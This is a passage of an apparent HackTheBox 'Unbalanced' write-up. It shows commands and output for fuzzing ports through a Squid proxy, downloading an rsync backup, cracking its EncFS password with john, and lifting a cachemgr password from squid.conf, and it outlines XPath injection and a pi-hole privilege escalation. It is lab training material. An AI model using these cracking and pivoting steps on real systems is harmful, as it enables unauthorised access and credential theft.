@@ -1,0 +1,1640 @@
+HTB - Unbalanced
+
+The box entails having to baisc enumeration on the rsync service ad the webserver that is being
+utilized to be host web content. 
+
+We enumerate the rsync share and file a backup directory that appears to be encrypted, we come to find this by using "ent" which allows to detect the entropy of files to test if they a areregular ascii 
+or encrypted files. We use th enc2john utility to get a hash of the directory that we can use john 
+the ripper to try and crack the password that will allow is to read the contents of the directory. 
+
+After doing so we are able to get a better view of the service being hosted on the 
+server such as the squid proxy that using load balancers to handle web requests. Once we analyzed 
+the webserver we come to find that there might be a third balancer that might be in use that 
+we could potentially be leveraged to gain a foothold on the webserver. We come to find through 
+proxy manipulation burp proxy and foxyproxy, that there is indeed a third load balancer that has been
+diabled but still accessible through local proy redirection. 
+
+Once we are able to actively touch the third load balancer we can now get access to login prompt and 
+we try to test for sql injection but are unable to find evidence of it being sql, next thing to look for is perhaps xpath injection and indeed we come to find it is xpath injectable and we are revealed
+the users that operate the web server, we come to find that we can indeed perform blind query probes 
+to get more knwledge of the system and even reveal the password of the users by doing the blind 
+injection of true or false queries. 
+
+After learning the password of the default user, we can ssh into the machine and try 
+to find a way to elevate our privileges. We come to find through notes left behind the user that 
+we pi-hole is being used by the host which is being used by the host. We come to find that there is
+cve from pi-hole that may perhaps allow us to get further sideways access to see if we can keep 
+escalating once we perform the attack and get the pihole user access. We are able to look at the
+files that user has access and coe to find that one of the scripts running pihole includes the root
+password, allowing us to effectively elevate our privileges and get full control of the box. 
+
+
+Start of Host Exploitation
+================================================================================================
+
+After performing basic enumeration we come to find three open ports: 22, 80, and 3128. We will
+use tools ffuf to try and get more infromation out of the proxy.
+
+First we create a word list of numbers that ffuf is able to a parse to scan if more ports are 
+avilable than what the nmap scan actually portrays.
+
+Using foxy proxy, we set the proxy to 10.10.10.200:3128, when we use our browser and go to 127.0.0.1
+we get a squid error message. Good thing is it does not prompt for user authentication.
+
+We will filter on the status code "403".
+
+COMMAND:
+================================================================================================
+for i in $(seq 1 65535); do echo $i; done > ports
+ffuf -x http://10.10.10.200:3128 -u http://127.0.0.1:FUZZ -w ports -fc 403
+================================================================================================
+OUTPUT:
+================================================================================================
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.0.2
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://127.0.0.1:FUZZ
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Proxy            : http://10.10.10.200:3128
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403
+ :: Filter           : Response status: 403
+________________________________________________
+
+:: Progress: [65535/65535] :: Job [1/1] :: 390 req/sec :: Duration: [0:02:48] :: Errors: 0 ::
+================================================================================================
+
+We are unable to get any data from the ffuf brute force so the next thing to do. Is look at the rsync
+and see if we can get any data.
+COMMAND:
+================================================================================================
+rsync rsync://10.10.10.200
+rsync rsync://10.10.10.200/conf_backups
+================================================================================================
+OUTPUT:
+================================================================================================
+conf_backups   	EncFS-encrypted configuration backups
+
+drwxr-xr-x          4,096 2020/04/04 11:05:32 .
+-rw-r--r--            288 2020/04/04 11:05:31 ,CBjPJW4EGlcqwZW4nmVqBA6
+-rw-r--r--            135 2020/04/04 11:05:31 -FjZ6-6,Fa,tMvlDsuVAO7ek
+-rw-r--r--          1,297 2020/04/02 09:06:19 .encfs6.xml
+-rw-r--r--            154 2020/04/04 11:05:32 0K72OfkNRRx3-f0Y6eQKwnjn
+-rw-r--r--             56 2020/04/04 11:05:32 27FonaNT2gnNc3voXuKWgEFP4sE9mxg0OZ96NB0x4OcLo-
+-rw-r--r--            190 2020/04/04 11:05:32 2VyeljxHWrDX37La6FhUGIJS
+-rw-r--r--            386 2020/04/04 11:05:31 3E2fC7coj5,XQ8LbNXVX9hNFhsqCjD-g3b-7Pb5VJHx3C1
+-rw-r--r--            537 2020/04/04 11:05:31 3cdBkrRF7R5bYe1ZJ0KYy786
+-rw-r--r--            560 2020/04/04 11:05:31 3xB4vSQH-HKVcOMQIs02Qb9,
+-rw-r--r--            275 2020/04/04 11:05:32 4J8k09nLNFsb7S-JXkxQffpbCKeKFNJLk6NRQmI11FazC1
+-rw-r--r--            463 2020/04/04 11:05:32 5-6yZKVDjG4n-AMPD65LOpz6-kz,ae0p2VOWzCokOwxbt,
+-rw-r--r--          2,169 2020/04/04 11:05:31 5FTRnQDoLdRfOEPkrhM2L29P
+-rw-r--r--            238 2020/04/04 11:05:31 5IUA28wOw0wwBs8rP5xjkFSs
+-rw-r--r--          1,277 2020/04/04 11:05:31 6R1rXixtFRQ5c9ScY8MBQ1Rg
+-rw-r--r--            108 2020/04/04 11:05:31 7-dPsi7efZRoXkZ5oz1AxVd-Q,L05rofx0Mx8N2dQyUNA,
+-rw-r--r--          1,339 2020/04/04 11:05:32 7zivDbWdbySIQARaHlm3NbC-7dUYF-rpYHSQqLNuHTVVN1
+-rw-r--r--          1,050 2020/04/04 11:05:31 8CBL-MBKTDMgB6AT2nfWfq-e
+-rw-r--r--            152 2020/04/04 11:05:31 8XDA,IOhFFlhh120yl54Q0da
+-rw-r--r--             29 2020/04/04 11:05:31 8e6TAzw0xs2LVxgohuXHhWjM
+-rw-r--r--          5,721 2020/04/04 11:05:31 9F9Y,UITgMo5zsWaP1TwmOm8EvDCWwUZurrL0TwjR,Gxl0
+-rw-r--r--          2,980 2020/04/04 11:05:31 A4qOD1nvqe9JgKnslwk1sUzO
+-rw-r--r--            443 2020/04/04 11:05:31 Acv0PEQX8vs-KdK307QNHaiF
+-rw-r--r--            935 2020/04/04 11:05:31 B6J5M3OP0X7W25ITnaZX753T
+-rw-r--r--          1,521 2020/04/04 11:05:32 Chlsy5ahvpl5Q0o3hMyUIlNwJbiNG99DxXJeR5vXXFgHC1
+-rw-r--r--          2,359 2020/04/04 11:05:31 ECXONXBBRwhb5tYOIcjjFZzh
+-rw-r--r--          1,464 2020/04/04 11:05:32 F4F9opY2nhVVnRgiQ,OUs-Y0
+-rw-r--r--            354 2020/04/04 11:05:32 FGZsMmjhKz7CJ2r-OjxkdOfKdEip4Gx2vCDI24GXSF5eB1
+-rw-r--r--          3,275 2020/04/04 11:05:31 FSXWRSwW6vOvJ0ExPK0fXJ6F
+-rw-r--r--             95 2020/04/04 11:05:31 IymL3QugM,XxLuKEdwJJOOpi
+-rw-r--r--            340 2020/04/04 11:05:31 KPYfvxIoOlrRjTY18zi8Wne-
+-rw-r--r--            158 2020/04/04 11:05:32 Kb-,NDTgYevHOGdHCYsSQhhIHrUGjiM6i2JZcl,-PKAJm0
+-rw-r--r--            518 2020/04/04 11:05:31 Kpo3MHQxksW2uYX79XngQu-f
+-rw-r--r--          1,448 2020/04/04 11:05:31 KtFc,DR7HqmGdPOkM2CpLaM9
+-rw-r--r--            714 2020/04/04 11:05:31 Mv5TtpmUNnVl-fgqQeYAy8uu
+-rw-r--r--            289 2020/04/04 11:05:31 MxgjShAeN6AmkH2tQAsfaj6C
+-rw-r--r--          4,499 2020/04/04 11:05:31 Ni8LDatT134DF6hhQf5ESpo5
+-rw-r--r--          2,187 2020/04/04 11:05:31 Nlne5rpWkOxkPNC15SEeJ8g,
+-rw-r--r--            199 2020/04/04 11:05:32 OFG2vAoaW3Tvv1X2J5fy4UV8
+-rw-r--r--            914 2020/04/04 11:05:32 OvBqims-kvgGyJJqZ59IbGfy
+-rw-r--r--            427 2020/04/04 11:05:31 StlxkG05UY9zWNHBhXxukuP9
+-rw-r--r--             17 2020/04/04 11:05:31 TZGfSHeAM42o9TgjGUdOSdrd
+-rw-r--r--        316,561 2020/04/04 11:05:31 VQjGnKU1puKhF6pQG1aah6rc
+-rw-r--r--          2,049 2020/04/04 11:05:31 W5,ILrUB4dBVW-Jby5AUcGsz
+-rw-r--r--            685 2020/04/04 11:05:31 Wr0grx0GnkLFl8qT3L0CyTE6
+-rw-r--r--            798 2020/04/04 11:05:31 X93-uArUSTL,kiJpOeovWTaP
+-rw-r--r--          1,591 2020/04/04 11:05:31 Ya30M5le2NKbF6rD-qD3M-7t
+-rw-r--r--          1,897 2020/04/04 11:05:31 Yw0UEJYKN,Hjf-QGqo3WObHy
+-rw-r--r--            128 2020/04/04 11:05:31 Z8,hYzUjW0GnBk1JP,8ghCsC
+-rw-r--r--          2,989 2020/04/04 11:05:31 ZXUUpn9SCTerl0dinZQYwxrx
+-rw-r--r--             42 2020/04/04 11:05:31 ZvkMNEBKPRpOHbGoefPa737T
+-rw-r--r--          1,138 2020/04/04 11:05:31 a4zdmLrBYDC24s9Z59y-Pwa2
+-rw-r--r--          3,643 2020/04/04 11:05:31 c9w3APbCYWfWLsq7NFOdjQpA
+-rw-r--r--            332 2020/04/04 11:05:31 cwJnkiUiyfhynK2CvJT7rbUrS3AEJipP7zhItWiLcRVSA1
+-rw-r--r--          2,592 2020/04/04 11:05:31 dF2GU58wFl3x5R7aDE6QEnDj
+-rw-r--r--          1,268 2020/04/04 11:05:31 dNTEvgsjgG6lKBr8ev8Dw,p7
+-rw-r--r--            422 2020/04/04 11:05:31 gK5Z2BBMSh9iFyCFfIthbkQ6
+-rw-r--r--          2,359 2020/04/04 11:05:31 gRhKiGIEm4SvYkTCLlOQPeh-
+-rw-r--r--          1,996 2020/04/04 11:05:32 hqZXaSCJi-Jso02DJlwCtYoz
+-rw-r--r--          1,883 2020/04/04 11:05:32 iaDKfUAHJmdqTDVZsmCIS,Bn
+-rw-r--r--          4,572 2020/04/04 11:05:31 jIY9q65HMBxJqUW48LJIc,Fj
+-rw-r--r--          5,068 2020/04/04 11:05:31 kdJ5whfqyrkk6avAhlX-x0kh
+-rw-r--r--            657 2020/04/04 11:05:31 kheep9TIpbbdwNSfmNU1QNk-
+-rw-r--r--            612 2020/04/04 11:05:31 l,LY6YoFepcaLg67YoILNGg0
+-rw-r--r--             46 2020/04/04 11:05:31 lWiv4yDEUfliy,Znm17Al41zi0BbMtCbN8wK4gHc333mt,
+-rw-r--r--          1,636 2020/04/04 11:05:31 mMGincizgMjpsBjkhWq-Oy0D
+-rw-r--r--          1,743 2020/04/04 11:05:31 oPu0EVyHA6,KmoI1T,LTs83x
+-rw-r--r--             52 2020/04/04 11:05:31 pfTT,nZnCUFzyPPOeX9NwQVo
+-rw-r--r--          1,050 2020/04/04 11:05:31 pn6YPUx69xqxRXKqg5B5D2ON
+-rw-r--r--            650 2020/04/04 11:05:31 q5RFgoRK2Ttl3U5W8fjtyriX
+-rw-r--r--            660 2020/04/04 11:05:32 qeHNkZencKDjkr3R746ZzO5K
+-rw-r--r--          2,977 2020/04/04 11:05:32 sNiR-scp-DZrXHg4coa9KBmZ
+-rw-r--r--            820 2020/04/04 11:05:32 sfT89u8dsEY4n99lNsUFOwki
+-rw-r--r--            254 2020/04/04 11:05:31 uEtPZwC2tjaQELJmnNRTCLYU
+-rw-r--r--            203 2020/04/04 11:05:31 vCsXjR1qQmPO5g3P3kiFyO84
+-rw-r--r--            670 2020/04/04 11:05:32 waEzfb8hYE47wHeslfs1MvYdVxqTtQ8XGshJssXMmvOsZLhtJWWRX31cBfhdVygrCV5
+
+================================================================================================
+
+We get the share list that is available for the public to read however, it appears to be somehow 
+encrypted. We are going to try and find if any of the files are not encrypted by checking the
+entropy(randomness) of the file. First we archive the files and place them in a specified directory.
+
+COMMAND:
+================================================================================================
+rsync -av rsync://10.10.10.200/conf_backups conf_backups
+================================================================================================
+OUTPUT:
+================================================================================================
+receiving incremental file list
+created directory conf_backups
+./
+,CBjPJW4EGlcqwZW4nmVqBA6
+-FjZ6-6,Fa,tMvlDsuVAO7ek
+.encfs6.xml
+0K72OfkNRRx3-f0Y6eQKwnjn
+27FonaNT2gnNc3voXuKWgEFP4sE9mxg0OZ96NB0x4OcLo-
+2VyeljxHWrDX37La6FhUGIJS
+3E2fC7coj5,XQ8LbNXVX9hNFhsqCjD-g3b-7Pb5VJHx3C1
+3cdBkrRF7R5bYe1ZJ0KYy786
+3xB4vSQH-HKVcOMQIs02Qb9,
+4J8k09nLNFsb7S-JXkxQffpbCKeKFNJLk6NRQmI11FazC1
+5-6yZKVDjG4n-AMPD65LOpz6-kz,ae0p2VOWzCokOwxbt,
+5FTRnQDoLdRfOEPkrhM2L29P
+5IUA28wOw0wwBs8rP5xjkFSs
+6R1rXixtFRQ5c9ScY8MBQ1Rg
+7-dPsi7efZRoXkZ5oz1AxVd-Q,L05rofx0Mx8N2dQyUNA,
+7zivDbWdbySIQARaHlm3NbC-7dUYF-rpYHSQqLNuHTVVN1
+8CBL-MBKTDMgB6AT2nfWfq-e
+8XDA,IOhFFlhh120yl54Q0da
+8e6TAzw0xs2LVxgohuXHhWjM
+9F9Y,UITgMo5zsWaP1TwmOm8EvDCWwUZurrL0TwjR,Gxl0
+A4qOD1nvqe9JgKnslwk1sUzO
+Acv0PEQX8vs-KdK307QNHaiF
+B6J5M3OP0X7W25ITnaZX753T
+Chlsy5ahvpl5Q0o3hMyUIlNwJbiNG99DxXJeR5vXXFgHC1
+ECXONXBBRwhb5tYOIcjjFZzh
+F4F9opY2nhVVnRgiQ,OUs-Y0
+FGZsMmjhKz7CJ2r-OjxkdOfKdEip4Gx2vCDI24GXSF5eB1
+FSXWRSwW6vOvJ0ExPK0fXJ6F
+IymL3QugM,XxLuKEdwJJOOpi
+KPYfvxIoOlrRjTY18zi8Wne-
+Kb-,NDTgYevHOGdHCYsSQhhIHrUGjiM6i2JZcl,-PKAJm0
+Kpo3MHQxksW2uYX79XngQu-f
+KtFc,DR7HqmGdPOkM2CpLaM9
+Mv5TtpmUNnVl-fgqQeYAy8uu
+MxgjShAeN6AmkH2tQAsfaj6C
+Ni8LDatT134DF6hhQf5ESpo5
+Nlne5rpWkOxkPNC15SEeJ8g,
+OFG2vAoaW3Tvv1X2J5fy4UV8
+OvBqims-kvgGyJJqZ59IbGfy
+StlxkG05UY9zWNHBhXxukuP9
+TZGfSHeAM42o9TgjGUdOSdrd
+VQjGnKU1puKhF6pQG1aah6rc
+W5,ILrUB4dBVW-Jby5AUcGsz
+Wr0grx0GnkLFl8qT3L0CyTE6
+X93-uArUSTL,kiJpOeovWTaP
+Ya30M5le2NKbF6rD-qD3M-7t
+Yw0UEJYKN,Hjf-QGqo3WObHy
+Z8,hYzUjW0GnBk1JP,8ghCsC
+ZXUUpn9SCTerl0dinZQYwxrx
+ZvkMNEBKPRpOHbGoefPa737T
+a4zdmLrBYDC24s9Z59y-Pwa2
+c9w3APbCYWfWLsq7NFOdjQpA
+cwJnkiUiyfhynK2CvJT7rbUrS3AEJipP7zhItWiLcRVSA1
+dF2GU58wFl3x5R7aDE6QEnDj
+dNTEvgsjgG6lKBr8ev8Dw,p7
+gK5Z2BBMSh9iFyCFfIthbkQ6
+gRhKiGIEm4SvYkTCLlOQPeh-
+hqZXaSCJi-Jso02DJlwCtYoz
+iaDKfUAHJmdqTDVZsmCIS,Bn
+jIY9q65HMBxJqUW48LJIc,Fj
+kdJ5whfqyrkk6avAhlX-x0kh
+kheep9TIpbbdwNSfmNU1QNk-
+l,LY6YoFepcaLg67YoILNGg0
+lWiv4yDEUfliy,Znm17Al41zi0BbMtCbN8wK4gHc333mt,
+mMGincizgMjpsBjkhWq-Oy0D
+oPu0EVyHA6,KmoI1T,LTs83x
+pfTT,nZnCUFzyPPOeX9NwQVo
+pn6YPUx69xqxRXKqg5B5D2ON
+q5RFgoRK2Ttl3U5W8fjtyriX
+qeHNkZencKDjkr3R746ZzO5K
+sNiR-scp-DZrXHg4coa9KBmZ
+sfT89u8dsEY4n99lNsUFOwki
+uEtPZwC2tjaQELJmnNRTCLYU
+vCsXjR1qQmPO5g3P3kiFyO84
+waEzfb8hYE47wHeslfs1MvYdVxqTtQ8XGshJssXMmvOsZLhtJWWRX31cBfhdVygrCV5
+
+sent 1,452 bytes  received 411,990 bytes  30,625.33 bytes/sec
+total size is 405,603  speedup is 0.98
+================================================================================================
+
+We will use the "ent" command to find the entropy of each file and see if we can find something that
+is not encrypted.
+
+COMMAND:
+================================================================================================
+find . -exec ent {} \; | grep Entropy | awk '{print $3}' | sort -n
+================================================================================================
+OUTPUT:
+================================================================================================
+0.000000
+3.969816
+4.720050
+4.994953
+5.229871
+5.249460
+5.532076
+5.543875
+6.204015
+6.352019
+6.580374
+6.622932
+6.670622
+6.785660
+6.865654
+6.876100
+6.984037
+7.010849
+7.109168
+7.176259
+7.190787
+7.209697
+7.323533
+7.415004
+7.456589
+7.464747
+7.470782
+7.484700
+7.489929
+7.506422
+7.539348
+7.585875
+7.607978
+7.630516
+7.638044
+7.645107
+7.663192
+7.666026
+7.687554
+7.692077
+7.708083
+7.749516
+7.771276
+7.774360
+7.776546
+7.812896
+7.824802
+7.834932
+7.852249
+7.856325
+7.862068
+7.863815
+7.880995
+7.886423
+7.888844
+7.896295
+7.899161
+7.903484
+7.905063
+7.905615
+7.913633
+7.914737
+7.915591
+7.918457
+7.919490
+7.928036
+7.933499
+7.934424
+7.940262
+7.945788
+7.952778
+7.954955
+7.955585
+7.960966
+7.964372
+7.999465
+
+================================================================================================
+
+We now have an entropy lst of all the files, generally the smaller the entropy the more likely it
+is human readable not encrypted. So we should look at the files with entropy less than 5.
+
+COMMAND:
+================================================================================================
+for i in $(ls -a .); do echo $i ; ent $i ; done | less
+================================================================================================
+OUTPUT:
+================================================================================================
+..
+..
+..
+
+Cannot open file 4
+2020
+Cannot open file 2020
+Yw0UEJYKN,Hjf-QGqo3WObHy
+Entropy = 7.896295 bits per byte.
+
+Optimum compression would reduce the size
+of this 1897 byte file by 1 percent.
+
+Chi square distribution for 1897 samples is 265.84, and randomly
+would exceed this value 30.75 percent of the times.
+
+Arithmetic mean value of data bytes is 125.4797 (127.5 = random).
+Monte Carlo value for Pi is 3.202531646 (error 1.94 percent).
+Serial correlation coefficient is 0.006685 (totally uncorrelated = 0.0).
+
+...
+..
+.
+================================================================================================
+
+We can find all the files in the directory and see a plain text file, "./.encfs6.xml", which is an 
+xml config file.  
+COMMAND:
+================================================================================================
+find .
+================================================================================================
+OUTPUT:
+================================================================================================
+.
+./StlxkG05UY9zWNHBhXxukuP9
+./A4qOD1nvqe9JgKnslwk1sUzO
+./Mv5TtpmUNnVl-fgqQeYAy8uu
+./gK5Z2BBMSh9iFyCFfIthbkQ6
+./sNiR-scp-DZrXHg4coa9KBmZ
+./TZGfSHeAM42o9TgjGUdOSdrd
+./c9w3APbCYWfWLsq7NFOdjQpA
+./VQjGnKU1puKhF6pQG1aah6rc
+./3xB4vSQH-HKVcOMQIs02Qb9,
+./Acv0PEQX8vs-KdK307QNHaiF
+./,CBjPJW4EGlcqwZW4nmVqBA6
+./5-6yZKVDjG4n-AMPD65LOpz6-kz,ae0p2VOWzCokOwxbt,
+./FGZsMmjhKz7CJ2r-OjxkdOfKdEip4Gx2vCDI24GXSF5eB1
+./W5,ILrUB4dBVW-Jby5AUcGsz
+./F4F9opY2nhVVnRgiQ,OUs-Y0
+./a4zdmLrBYDC24s9Z59y-Pwa2
+./OvBqims-kvgGyJJqZ59IbGfy
+./pn6YPUx69xqxRXKqg5B5D2ON
+./jIY9q65HMBxJqUW48LJIc,Fj
+./27FonaNT2gnNc3voXuKWgEFP4sE9mxg0OZ96NB0x4OcLo-
+./Ni8LDatT134DF6hhQf5ESpo5
+./dNTEvgsjgG6lKBr8ev8Dw,p7
+./Kb-,NDTgYevHOGdHCYsSQhhIHrUGjiM6i2JZcl,-PKAJm0
+./lWiv4yDEUfliy,Znm17Al41zi0BbMtCbN8wK4gHc333mt,
+./KPYfvxIoOlrRjTY18zi8Wne-
+./ent.lst
+./cwJnkiUiyfhynK2CvJT7rbUrS3AEJipP7zhItWiLcRVSA1
+./B6J5M3OP0X7W25ITnaZX753T
+./Chlsy5ahvpl5Q0o3hMyUIlNwJbiNG99DxXJeR5vXXFgHC1
+./iaDKfUAHJmdqTDVZsmCIS,Bn
+./Z8,hYzUjW0GnBk1JP,8ghCsC
+./7zivDbWdbySIQARaHlm3NbC-7dUYF-rpYHSQqLNuHTVVN1
+./pfTT,nZnCUFzyPPOeX9NwQVo
+./Nlne5rpWkOxkPNC15SEeJ8g,
+./4J8k09nLNFsb7S-JXkxQffpbCKeKFNJLk6NRQmI11FazC1
+./Ya30M5le2NKbF6rD-qD3M-7t
+./.encfs6.xml
+./gRhKiGIEm4SvYkTCLlOQPeh-
+./uEtPZwC2tjaQELJmnNRTCLYU
+./OFG2vAoaW3Tvv1X2J5fy4UV8
+./Yw0UEJYKN,Hjf-QGqo3WObHy
+./0K72OfkNRRx3-f0Y6eQKwnjn
+./2VyeljxHWrDX37La6FhUGIJS
+./l,LY6YoFepcaLg67YoILNGg0
+./8e6TAzw0xs2LVxgohuXHhWjM
+./Kpo3MHQxksW2uYX79XngQu-f
+./sfT89u8dsEY4n99lNsUFOwki
+./dF2GU58wFl3x5R7aDE6QEnDj
+./-FjZ6-6,Fa,tMvlDsuVAO7ek
+./8CBL-MBKTDMgB6AT2nfWfq-e
+./hqZXaSCJi-Jso02DJlwCtYoz
+./ECXONXBBRwhb5tYOIcjjFZzh
+./mMGincizgMjpsBjkhWq-Oy0D
+./oPu0EVyHA6,KmoI1T,LTs83x
+./KtFc,DR7HqmGdPOkM2CpLaM9
+./3cdBkrRF7R5bYe1ZJ0KYy786
+./7-dPsi7efZRoXkZ5oz1AxVd-Q,L05rofx0Mx8N2dQyUNA,
+./6R1rXixtFRQ5c9ScY8MBQ1Rg
+./ZXUUpn9SCTerl0dinZQYwxrx
+./q5RFgoRK2Ttl3U5W8fjtyriX
+./X93-uArUSTL,kiJpOeovWTaP
+./qeHNkZencKDjkr3R746ZzO5K
+./vCsXjR1qQmPO5g3P3kiFyO84
+./9F9Y,UITgMo5zsWaP1TwmOm8EvDCWwUZurrL0TwjR,Gxl0
+./MxgjShAeN6AmkH2tQAsfaj6C
+./5FTRnQDoLdRfOEPkrhM2L29P
+./FSXWRSwW6vOvJ0ExPK0fXJ6F
+./3E2fC7coj5,XQ8LbNXVX9hNFhsqCjD-g3b-7Pb5VJHx3C1
+./kdJ5whfqyrkk6avAhlX-x0kh
+./kheep9TIpbbdwNSfmNU1QNk-
+./ZvkMNEBKPRpOHbGoefPa737T
+./Wr0grx0GnkLFl8qT3L0CyTE6
+./8XDA,IOhFFlhh120yl54Q0da
+./waEzfb8hYE47wHeslfs1MvYdVxqTtQ8XGshJssXMmvOsZLhtJWWRX31cBfhdVygrCV5
+./IymL3QugM,XxLuKEdwJJOOpi
+./5IUA28wOw0wwBs8rP5xjkFSs
+================================================================================================
+
+After looking at the file, we can attempt to crack it john the ripper. But first we need to generate
+the hash. The xml file pieces the rest of the encrypted files together. Google encfs to john. Or
+run locate to find the python script that converts it to a hash and then run the tool to get a hash.
+COMMAND:
+================================================================================================
+/usr/share/john/encfs2john.py conf_backups/
+================================================================================================
+OUTPUT:
+================================================================================================
+conf_backups/:$encfs$192*580280*0*20*99176a6e4d96c0b32bad9d4feb3d8e425165f105*44*1b2a580dea6cda1aedd96d0b72f43de132b239f51c224852030dfe8892da2cad329edc006815a3e84b887add
+================================================================================================
+
+Place the hash in a file and run john
+
+COMMAND:
+================================================================================================
+john hash --wordlist=/usr/share/wordlists/rockyou.txt
+================================================================================================
+OUTPUT:
+================================================================================================
+Using default input encoding: UTF-8
+Loaded 1 password hash (EncFS [PBKDF2-SHA1 256/256 AVX2 8x AES])
+Cost 1 (iteration count) is 580280 for all loaded hashes
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+bubblegum        (conf_backups/)
+1g 0:00:00:16 DONE (2020-12-06 18:52) 0.06191g/s 44.58p/s 44.58c/s 44.58C/s bambam..marissa
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+================================================================================================
+
+We now have the password which we can now use to decrypt the files in the backup directory.
+We make a directory to hold the unencrypted while using "encfs" to unecrypt the files
+ie specify full paths for it to mount properly.
+
+COMMAND:
+================================================================================================
+encfs ~/htb/unbalanced/rsync/conf_backups ~/htb/unbalanced/rsync/unenc_backups
+cd unenc_backups
+ls
+================================================================================================
+OUTPUT:
+================================================================================================
+50-localauthority.conf              hdparm.conf                      parser.conf
+50-nullbackend.conf                 host.conf                        protect-links.conf
+51-debian-sudo.conf                 initramfs.conf                   reportbug.conf
+70debconf                           input.conf                       resolv.conf
+99-sysctl.conf                      journald.conf                    resolved.conf
+access.conf                         kernel-img.conf                  rsyncd.conf
+adduser.conf                        ldap.conf                        rsyslog.conf
+bluetooth.conf                      ld.so.conf                       semanage.conf
+ca-certificates.conf                libaudit.conf                    sepermit.conf
+com.ubuntu.SoftwareProperties.conf  libc.conf                        sleep.conf
+dconf                               limits.conf                      squid.conf
+debconf.conf                        listchanges.conf                 sysctl.conf
+debian.conf                         logind.conf                      system.conf
+deluser.conf                        logrotate.conf                   time.conf
+dhclient.conf                       main.conf                        timesyncd.conf
+discover-modprobe.conf              mke2fs.conf                      ucf.conf
+dkms.conf                           modules.conf                     udev.conf
+dns.conf                            namespace.conf                   update-initramfs.conf
+dnsmasq.conf                        network.conf                     user.conf
+docker.conf                         networkd.conf                    user-dirs.conf
+fakeroot-x86_64-linux-gnu.conf      nsswitch.conf                    Vendor.conf
+framework.conf                      org.freedesktop.PackageKit.conf  wpa_supplicant.conf
+fuse.conf                           PackageKit.conf                  x86_64-linux-gnu.conf
+gai.conf                            pam.conf                         xattr.conf
+group.conf                          pam_env.conf
+================================================================================================
+
+Now we have a plain text view of all the files. We look at the rsync conf file to see if there any
+hidden directories. We also want to take a look athe sqiud conf and we filter out all the comments
+
+COMMAND:
+================================================================================================
+grep -v '^\#' squid.conf | grep .
+================================================================================================
+OUTPUT:
+================================================================================================
+acl localnet src 0.0.0.1-0.255.255.255	# RFC 1122 "this" network (LAN)
+acl localnet src 10.0.0.0/8		# RFC 1918 local private network (LAN)
+acl localnet src 100.64.0.0/10		# RFC 6598 shared address space (CGN)
+acl localnet src 169.254.0.0/16 	# RFC 3927 link-local (directly plugged) machines
+acl localnet src 172.16.0.0/12		# RFC 1918 local private network (LAN)
+acl localnet src 192.168.0.0/16		# RFC 1918 local private network (LAN)
+acl localnet src fc00::/7       	# RFC 4193 local private network range
+acl localnet src fe80::/10      	# RFC 4291 link-local (directly plugged) machines
+acl SSL_ports port 443
+acl Safe_ports port 80		# http
+acl Safe_ports port 21		# ftp
+acl Safe_ports port 443		# https
+acl Safe_ports port 70		# gopher
+acl Safe_ports port 210		# wais
+acl Safe_ports port 1025-65535	# unregistered ports
+acl Safe_ports port 280		# http-mgmt
+acl Safe_ports port 488		# gss-http
+acl Safe_ports port 591		# filemaker
+acl Safe_ports port 777		# multiling http
+acl CONNECT method CONNECT
+http_access deny !Safe_ports
+http_access deny CONNECT !SSL_ports
+http_access allow manager
+include /etc/squid/conf.d/*
+http_access allow localhost
+acl intranet dstdomain -n intranet.unbalanced.htb
+acl intranet_net dst -n 172.16.0.0/12
+http_access allow intranet
+http_access allow intranet_net
+http_access deny all
+http_port 3128
+coredump_dir /var/spool/squid
+refresh_pattern ^ftp:		1440	20%	10080
+refresh_pattern ^gopher:	1440	0%	1440
+refresh_pattern -i (/cgi-bin/|\?) 0	0%	0
+refresh_pattern .		0	20%	4320
+cachemgr_passwd Thah$Sh1 menu pconn mem diskd fqdncache filedescriptors objects vm_objects counters 5min 60min histograms cbdata sbuf events
+cachemgr_passwd disable all
+cache disable
+================================================================================================
+
+Looking at the output we get a hostname disclosure in form of "intranet.unbalanced.htb"
+What we can do is now add that as an entry for our localhost since we will be using the squid 
+proxy to access it in /etc/hosts, we also find an intranet subnet and we could scan it but it could 
+take a while.
+
+We also come to find a 'cachemgr_passwd':'Thah$Sh1' 
+
+We can attempt to connect with curl and we get some output
+COMMAND:
+================================================================================================
+curl -p 10.10.10.200:3128 intranet.unbalanced.htb
+================================================================================================
+OUTPUT:
+================================================================================================
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
+<html><head>
+<meta type="copyright" content="Copyright (C) 1996-2018 The Squid Software Foundation and contributors">
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<title>ERROR: The requested URL could not be retrieved</title>
+<style type="text/css"><!-- 
+ /*
+ * Copyright (C) 1996-2019 The Squid Software Foundation and contributors
+ *
+ * Squid software is distributed under GPLv2+ license and includes
+ * contributions from numerous individuals and organizations.
+ * Please see the COPYING and CONTRIBUTORS files for details.
+ */
+
+/*
+ Stylesheet for Squid Error pages
+ Adapted from design by Free CSS Templates
+ http://www.freecsstemplates.org
+ Released for free under a Creative Commons Attribution 2.5 License
+*/
+
+/* Page basics */
+* {
+	font-family: verdana, sans-serif;
+}
+
+html body {
+	margin: 0;
+	padding: 0;
+	background: #efefef;
+	font-size: 12px;
+	color: #1e1e1e;
+}
+
+/* Page displayed title area */
+#titles {
+	margin-left: 15px;
+	padding: 10px;
+	padding-left: 100px;
+	background: url('/squid-internal-static/icons/SN.png') no-repeat left;
+}
+
+/* initial title */
+#titles h1 {
+	color: #000000;
+}
+#titles h2 {
+	color: #000000;
+}
+
+================================================================================================
+
+We go to the web browser and make sure to go though the squid proxy and when we check the site 
+we get redirected to "http://intranet.unbalanced.htb/intranet.php"
+
+If we try admin	admin we don't really get much output so we will send it to burp. We will go to proxy
+options and change the upstream proxy to that of the squid proxy. Burp suite will now send requests
+to the host.
+
+We received 7059 bytes after sending the login cred admin admin with no change.
+We can attempt to send various characters through the user and passwords and see if there is any 
+difference.
+
